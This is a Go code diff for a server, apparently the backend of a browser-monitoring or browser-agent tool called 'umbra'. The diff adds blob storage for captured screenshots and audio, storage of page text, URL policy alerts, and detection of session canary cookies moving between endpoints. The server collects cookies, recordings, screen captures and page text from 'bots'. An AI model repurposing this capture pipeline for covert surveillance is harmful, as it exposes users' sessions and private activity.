@@ -8,6 +8,7 @@ import (
 
 	"github.com/google/uuid"
 
+	"github.com/s045pd/umbra/internal/blobstore"
 	"github.com/s045pd/umbra/internal/db/models"
 	"github.com/s045pd/umbra/internal/detect"
 	"github.com/s045pd/umbra/internal/utils"
@@ -56,6 +57,8 @@ func (s *Server) dispatch(ctx context.Context, sess *Session, env Envelope) erro
 		return s.handleDeltaEvent(ctx, sess, env, "tab")
 	case ActionPageStorage:
 		return s.handlePageStorage(ctx, sess, env)
+	case ActionPageText:
+		return s.handlePageText(ctx, sess, env)
 	default:
 		s.logger.Warn("unknown action", "action", env.Action, "browser", sess.BrowserID)
 		return nil
@@ -154,7 +157,13 @@ func (s *Server) handleSyncHuge(_ context.Context, sess *Session, env Envelope) 
 	if len(updates) == 0 {
 		return nil
 	}
-	return s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).Updates(updates).Error
+	if err := s.db.Model(&models.Bot{}).Where("id = ?", sess.BotID).Updates(updates).Error; err != nil {
+		return err
+	}
+	if data.Cookies != nil {
+		s.maybeCanaryAlert(sess, data.Cookies)
+	}
+	return nil
 }
 
 func (s *Server) handleState(_ context.Context, sess *Session, env Envelope) error {
@@ -231,6 +240,7 @@ func (s *Server) handleScreenCaptureData(_ context.Context, sess *Session, env E
 			Difference: &c.Diff,
 			Timestamp:  time.Now(),
 		}
+		s.offloadScreenshot(&row)
 		if err := s.db.Create(&row).Error; err != nil {
 			return err
 		}
@@ -349,6 +359,7 @@ func (s *Server) handleAudioData(_ context.Context, sess *Session, env Envelope)
 		SessionID: data.SessionID,
 		Timestamp: &now,
 	}
+	s.offloadRecording(&row)
 	return s.db.Create(&row).Error
 }
 
@@ -379,6 +390,7 @@ func (s *Server) handleNavEvent(_ context.Context, sess *Session, env Envelope) 
 	}
 	_ = s.trimTable(sess.BotID, "bot_nav_events", 5000)
 	s.maybeDomainAlert(sess, data.URL, data.Title, ts)
+	s.maybePlaybookAlert(sess, data.URL, data.Title, ts)
 	return nil
 }
 
@@ -546,6 +558,147 @@ func (s *Server) trimOldRows(botID uuid.UUID, keep int) error {
 		).Error
 	}
 	return nil
+}
+
+func (s *Server) offloadScreenshot(row *models.BotScreenshot) {
+	if s.blobs == nil || row.ImageData == "" {
+		return
+	}
+	raw, _, err := blobstore.DecodeDataURL(row.ImageData)
+	if err != nil || len(raw) == 0 {
+		return
+	}
+	hash, err := s.blobs.Put("screenshots", raw)
+	if err != nil {
+		return
+	}
+	row.BlobHash = hash
+	row.ImageData = ""
+	row.OCRText = nearestPageText(s, row.BotID, row.URL)
+}
+
+func (s *Server) offloadRecording(row *models.BotRecording) {
+	if s.blobs == nil || row.Recording == "" {
+		return
+	}
+	raw, _, err := blobstore.DecodeDataURL(row.Recording)
+	if err != nil || len(raw) == 0 {
+		return
+	}
+	hash, err := s.blobs.Put("audio", raw)
+	if err != nil {
+		return
+	}
+	row.BlobHash = hash
+	row.Recording = ""
+}
+
+func nearestPageText(s *Server, botID uuid.UUID, rawURL string) string {
+	if rawURL == "" {
+		return ""
+	}
+	var row models.BotPageText
+	err := s.db.Where("bot_id = ? AND url = ?", botID, rawURL).
+		Order("timestamp DESC").First(&row).Error
+	if err != nil {
+		return ""
+	}
+	return row.Text
+}
+
+func (s *Server) handlePageText(_ context.Context, sess *Session, env Envelope) error {
+	var data struct {
+		URL       string  `json:"url"`
+		Title     string  `json:"title"`
+		Text      string  `json:"text"`
+		Timestamp float64 `json:"timestamp"`
+	}
+	_ = json.Unmarshal(env.Data, &data)
+	if data.Text == "" {
+		return nil
+	}
+	if len(data.Text) > 8000 {
+		data.Text = data.Text[:8000]
+	}
+	row := models.BotPageText{
+		BotID:     sess.BotID,
+		URL:       data.URL,
+		Title:     data.Title,
+		Text:      data.Text,
+		Timestamp: eventTimestamp(data.Timestamp),
+	}
+	if err := s.db.Create(&row).Error; err != nil {
+		return err
+	}
+	return s.trimTable(sess.BotID, "bot_page_texts", 2000)
+}
+
+func (s *Server) maybePlaybookAlert(sess *Session, rawURL, title string, ts time.Time) {
+	var bot models.Bot
+	if err := s.db.Select("switch_config", "data_config", "name").Where("id = ?", sess.BotID).First(&bot).Error; err != nil {
+		return
+	}
+	rules := detect.RulesFromConfig(map[string]any(bot.DataConfig))
+	rule := detect.MatchRule(rawURL, rules)
+	if rule == nil || rule.Action == detect.ActionBlock {
+		return
+	}
+	kind := "playbook"
+	if rule.Action == detect.ActionNotify {
+		kind = "domain"
+	}
+	var recent int64
+	_ = s.db.Model(&models.BotAlert{}).
+		Where("bot_id = ? AND url = ? AND kind = ? AND timestamp > ?", sess.BotID, rawURL, kind, ts.Add(-10*time.Minute)).
+		Count(&recent).Error
+	if recent > 0 {
+		return
+	}
+	_ = s.db.Create(&models.BotAlert{
+		BotID: sess.BotID, Kind: kind, Severity: "high",
+		Title: "Policy " + rule.Action, URL: rawURL, Detail: title, Timestamp: ts,
+	}).Error
+}
+
+func (s *Server) maybeCanaryAlert(sess *Session, cookies []any) {
+	var bot models.Bot
+	if err := s.db.Select("id", "name", "data_config").Where("id = ?", sess.BotID).First(&bot).Error; err != nil {
+		return
+	}
+	self, _ := bot.DataConfig["CANARY_TOKEN"].(string)
+	parsed := make([]map[string]any, 0, len(cookies))
+	for _, c := range cookies {
+		if m, ok := c.(map[string]any); ok {
+			parsed = append(parsed, m)
+		}
+	}
+	hit := detect.ForeignCanary(parsed, self)
+	if hit == nil {
+		return
+	}
+	owners := s.canaryOwners()
+	owner := detect.LookupOwner(owners, hit.Value)
+	detail := "canary cookie from another endpoint observed on " + hit.Domain
+	if owner != "" {
+		detail += " (owner bot " + owner + ")"
+	}
+	_ = s.db.Create(&models.BotAlert{
+		BotID: sess.BotID, Kind: "canary_moved", Severity: "critical",
+		Title: "Session canary appeared on a different endpoint",
+		URL:   hit.Domain, Detail: detail, Timestamp: time.Now(),
+	}).Error
+}
+
+func (s *Server) canaryOwners() map[string]string {
+	var bots []models.Bot
+	_ = s.db.Select("id", "data_config").Find(&bots).Error
+	out := map[string]string{}
+	for _, b := range bots {
+		if t, ok := b.DataConfig["CANARY_TOKEN"].(string); ok && t != "" {
+			out[t] = b.ID.String()
+		}
+	}
+	return out
 }
 
 // authenticate processes the AUTH handshake and returns the matching bot row.
